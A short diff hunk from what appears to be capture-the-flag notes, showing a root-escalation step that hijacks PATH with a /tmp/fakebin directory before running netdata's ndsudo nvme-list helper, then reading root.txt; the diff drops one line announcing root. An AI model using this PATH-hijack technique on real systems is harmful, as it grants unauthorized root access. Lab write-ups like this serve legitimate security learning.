@@ -59,7 +59,6 @@ Target:
 	    export PATH=/tmp/fakebin:$PATH
 	    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
 
-	You should now have root 
 -Root
 	Read the flag
 		cat root.txt
